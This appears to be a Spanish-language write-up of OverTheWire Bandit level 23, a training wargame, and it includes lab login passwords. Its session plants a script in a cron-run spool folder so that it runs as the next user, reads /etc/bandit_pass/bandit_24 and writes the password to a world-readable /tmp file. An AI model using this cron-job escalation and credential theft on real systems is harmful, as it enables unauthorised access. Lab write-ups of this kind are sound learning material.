# LEVEL 23-34

## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

## Datos acceso
ssh bandit23 @bandit.labs.overthewire.org -p 2220
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solucion
```bash
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh  
#!/bin/bashmyname=$(whoami)cd /var/spool/$myname  
echo "Executing and deleting all scripts in /var/spool/$myname:"  
for i in * .*;  
do  
    if [ "$i" != "." -a "$i" != ".." ];  
    then  
        echo "Handling $i"  
        owner="$(stat --format "%U" ./$i)"  
        if [ "${owner}" = "bandit23" ]; then  
            timeout -s 9 60 ./$i  
        fi  
        rm -f ./$i  
    fi  
done

bandit23@bandit:~$ mkdir /tmp/tempodir
bandit23@bandit:~$ cd tempodir
-bash: cd: tempodir: No such file or directory
bandit23@bandit:~$ cd /tmp/tempodir
bandit23@bandit:/tmp/tempodir$ ls
bandit23@bandit:/tmp/tempodir$ touch script.sh
bandit23@bandit:/tmp/tempodir$ ls
script.sh
bandit23@bandit:/tmp/tempodir$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/tempodir$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/tempodir$ cat script.sh
#!/bin/bash
cat /etc/bandit_pass/bandit_24 > /tmp/tempodir/password
bandit23@bandit:/tmp/tempodir$ touch password
bandit23@bandit:/tmp/tempodir$ chmod 777 -R /tmp/tempodir
bandit23@bandit:/tmp/tempodir$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tempodir$ ls =la
ls: cannot access '=la': No such file or directory
bandit23@bandit:/tmp/tempodir$ ls -la
total 124
drwxrwxrwx   2 bandit23 bandit23   4096 Mar  2 02:00 .
drwxrwx-wt 908 root     root     114688 Mar  2 02:01 ..
-rwxrwxrwx   1 bandit23 bandit23      0 Mar  2 02:00 password
-rwxrwxrwx   1 bandit23 bandit23     68 Mar  2 01:59 script.sh
bandit23@bandit:/tmp/tempodir$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

```
## Notas adicionales
l comando "cp" en Linux se utiliza para copiar archivos o directorios de un lugar a otro. Su sintaxis básica es la siguiente:

`cp origen destino`

Donde "origen" es la ubicación y el nombre del archivo o directorio que se desea copiar, y "destino" es la ubicación y el nombre del archivo o directorio al que se desea copiar.
## Referencias

